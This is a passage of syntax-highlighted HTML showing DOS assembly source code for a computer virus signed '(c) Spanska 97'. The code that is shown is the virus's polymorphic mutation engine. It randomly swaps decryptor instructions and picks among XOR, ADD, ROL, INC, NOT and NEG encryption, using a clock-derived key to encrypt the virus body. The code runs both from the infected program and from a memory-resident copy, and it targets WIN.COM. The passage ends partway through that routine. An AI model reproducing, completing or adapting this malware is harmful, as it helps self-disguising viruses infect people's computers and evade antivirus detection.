</span><span class="sc5">file_win</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"C:\WINDOWS\WIN.COM"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">copyright</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" (c) Spanska 97"</span><span class="sc0">

</span><span class="sc1">;****************************************************</span><span class="sc0">
</span><span class="sc1">;********** STUPID MUTATION ENGINE ******************</span><span class="sc0">
</span><span class="sc1">;****************************************************</span><span class="sc0">

</span><span class="sc5">poly_depuis_runtime</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">overwrite</span><span class="sc0">

</span><span class="sc5">poly_depuis_resident</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_virus</span><span class="sc0">      </span><span class="sc1">;adjust bp value to use from TSR</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc1">;-----random mutation of decryptor instructions and replacement of code-----</span><span class="sc0">

</span><span class="sc5">overwrite</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation0</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;stock of possible mutations</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation0</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;offset of mutation in decryptor</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">                      </span><span class="sc1">;number of possibilities</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc0">                      </span><span class="sc1">;byte number of this mutation</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">                  </span><span class="sc1">;random select one possibility</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation1</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation3</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation3</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation5</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation5</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation7</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation7</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation9</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation9</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">aleatoire</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">              </span><span class="sc1">;20% chances for a XOR encryption</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">evite_suite</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">cryptage_xor</span><span class="sc0">
</span><span class="sc5">evite_suite</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">              </span><span class="sc1">;20% chances for a ADD/SUB encryption</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">cryptage_add</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">55</span><span class="sc0">              </span><span class="sc1">;15% chances for a ROL/ROR encryption</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">cryptage_rol</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">70</span><span class="sc0">             </span><span class="sc1">;15% chances for a INC/DEC encryption</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">cryptage_inc</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">85</span><span class="sc0">              </span><span class="sc1">;15% chances for a NOT encryption</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">cryptage_not</span><span class="sc0">
            </span><span class="sc1">;15% chances for a NEG encryption</span><span class="sc0">

</span><span class="sc5">cryptage_neg</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">type_cryptage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation10sixte</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation10</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_autres_cryptages</span><span class="sc0">

</span><span class="sc5">cryptage_not</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">type_cryptage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation10quinte</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation10</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_autres_cryptages</span><span class="sc0">

</span><span class="sc5">cryptage_inc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">type_cryptage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation10quart</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation10</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_autres_cryptages</span><span class="sc0">

</span><span class="sc5">cryptage_rol</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">type_cryptage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation10ter</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation10</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_autres_cryptages</span><span class="sc0">

</span><span class="sc5">cryptage_add</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">type_cryptage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation10bis</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation10</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_autres_cryptages</span><span class="sc0">

</span><span class="sc5">cryptage_xor</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">type_cryptage</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation10</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation10</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc5">evite_autres_cryptages</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation11</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation11</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation12</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation13</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation13</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">_mutation14</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">mutation14</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mute_bloc</span><span class="sc0">

</span><span class="sc1">;---------------- new random encryption key from clock ---------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Ch</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clef</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">

</span><span class="sc1">;------------- encrypt virus body in the heap -----------------------------</span><span class="sc0">

</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">fin_cryptage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">debut_cryptage</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">type_cryptage</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">xor_crypte</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">sub_crypte</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ror_crypte</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">dec_crypte</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">not_crypte</span><span class="sc0">

